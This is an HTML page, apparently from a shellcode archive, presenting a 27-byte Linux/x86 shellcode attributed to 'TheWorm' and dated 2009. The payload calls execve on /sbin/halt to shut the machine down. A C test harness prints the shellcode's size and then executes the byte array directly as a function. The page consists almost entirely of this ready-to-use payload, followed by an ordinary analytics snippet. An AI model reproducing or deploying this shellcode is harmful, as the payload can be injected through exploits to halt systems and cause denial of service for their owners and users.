<html><head><title>Linux/x86 - execve(/sbin/halt,/sbin/halt) - 27 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;

const char shellcode[]=
	&quot;\x6a\x0b&quot;		// push	$0xb
	&quot;\x58&quot;			// pop	%eax
	&quot;\x99&quot;			// cltd
	&quot;\x52&quot;			// push	%edx
	&quot;\x66\x68\x6c\x74&quot;	// pushw $0x746c
	&quot;\x68\x6e\x2f\x68\x61&quot;	// push	$0x61682f6e
	&quot;\x68\x2f\x73\x62\x69&quot;	// push	$0x6962732f
	&quot;\x89\xe3&quot;		// mov	%esp,%ebx
	&quot;\x52&quot;			// push	%edx
	&quot;\x53&quot;			// push	%ebx
	&quot;\x89\xe1&quot;		// mov	%esp,%ecx
	&quot;\xcd\x80&quot;;		// int	$0x80

int main()
{
	printf	(&quot;\n[+] Linux/x86 execve(/sbin/halt,/sbin/halt)&quot;
		&quot;\n[+] Date: 11/07/2009&quot;
		&quot;\n[+] Author: TheWorm&quot;
		&quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;, sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
